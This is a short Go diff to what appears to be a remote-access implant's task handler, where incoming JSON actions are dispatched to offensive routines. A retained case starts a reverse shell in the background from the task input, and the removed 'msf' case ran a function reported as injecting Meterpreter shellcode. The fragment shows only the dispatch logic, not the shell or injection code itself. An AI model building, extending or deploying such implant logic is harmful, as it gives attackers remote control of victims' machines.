@@ -110,10 +110,6 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 		go RevShell(task.Input)
 		result.Result = "Interactive shell started in background"
 		result.ReturnCode = 0
-	case "msf":
-		go executeMSF()
-		result.Result = "Meterpreter Shellcode Injected"
-		result.ReturnCode = 0
 	default:
 		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
 	}
